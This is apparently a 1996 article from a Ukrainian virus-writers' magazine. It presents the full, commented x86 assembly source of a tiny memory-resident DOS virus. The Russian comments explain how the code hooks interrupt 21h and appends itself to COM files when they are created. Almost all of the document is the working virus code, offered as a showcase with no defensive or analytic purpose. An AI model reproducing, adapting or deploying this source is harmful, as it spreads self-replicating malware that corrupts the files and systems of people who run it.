;      ▄▄                  █
;     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV  1996
;     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
;      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █▀▀█ █ 
;       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▀▀▀█ █
;       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █▄▄█ █
;       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
;       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.

; Перед вами исходный текст одного их самых маленьких вирусов в мире.
; Его можно отнести к RC, т.е. резидентный, заражающий COM 
; файлы (файлы в имени которых есть символы 'co') при их
; создании функцией 3Ch. Работоспособен на процессорах 
; от i286 до i486 или их аналогах.

;                                      (c) Populizer (1996)

	.model	tiny
	.code
	org	100h
start:
	push	si		; si при старте = 100h, в стеке 100h
	push	si		; еще один 100h
	mov	es,bx		; bx при старте = 0, ES = 0
	mov	di,2B0h		; адрес начала резидентной части вируса
	cli			; запретить прерывания ( могут виснуть
				; некоторые программы )
	cmpsb			; проверить на наличие вируса в памяти
	jz	loc_2		; если вирус в памяти есть, то на выход
	dec	si		; si = 100h
	dec	di		; di = 2B0h
	mov	cl,50h		; cl = 80
				; ch может быть <> 0 (недостаток)
	rep	movsb		; передать по адресу 0:2B0 80 байт
	mov	si,21h*4	; si указывает на адрес int 21h
	push	si		; сохраним si
; записать сегмент и смещение int 21 в хвост вируса
	movs	word ptr es:[di],word ptr es:[si]	; es: movsw
	movs	word ptr es:[di],word ptr es:[si]	; es: movsw
	pop	di		; di = 84h
	mov	al,2Bh		; ah = 0, ax = 2Bh
	stosw			; новое значение для int 21h -> 2B:2B
	stosw
loc_2:
	pop	di		; di = 100h
	lea	si,[di+50h]	; si = 150h
	mov	cx,sp		; cx = 0FFFCh
	sub	cx,si		; cx = 0FFFEh-150h
	push	cs		; ES = CS
	pop	es
	rep	movsb		; опустить старое тело вниз
	retn			; хотя этой инструкции в памяти
				; уже не будет, тем не менее она
				; выполниться на процессорах i286-i486.
				; это так называемый 'эффект ковеера'.
; новый обработчик 21-го прерывания
;	org	12Bh
	cmp	ah,3Ch		; функция создания файла ?
	jne	loc_5		; если нет - на выход
; DS:DX - указывают на имя нового файла
; CX    - атрибут файла может быть от 0 до 27h
	int	0C0h		; если (2B0h+50h)/4 = 0C0h, т.е. адрес
				; старого обработчика int 21h
	push	ax		; запомним ax в стеке
	xchg	bx,ax		; bx = ax
	mov	si,dx		; si = dx

locloop_3:
	dec	si
	lodsw
	cmp	ax,'mo'		; поиск символов 'om' в имени файла
	loopnz	locloop_3	; продолжать пока zf=0 и cx<>0
	jnz	loc_4		; если символов нет, то не заражать
	push	ds		; запомнить ds
	push	cs		; ds = cs
	pop	ds
	mov	ah,40h		; функция запись в файл
	mov	cl,50h		; cx = 80
	cwd			; dx = sign(ax) = 0
	int 	21h		; записать cx байт по адресу ds:dx
	pop	ds		; восстановить ds
loc_4:
	pop	ax		; восстановить ax
	clc
	retf	2
loc_5:
	db	0EAh		; код команды jmp far
; начало файла-жертвы
	int	20h		; здесь храняться сегмент и смещение 
				; старого int 21h
end	start
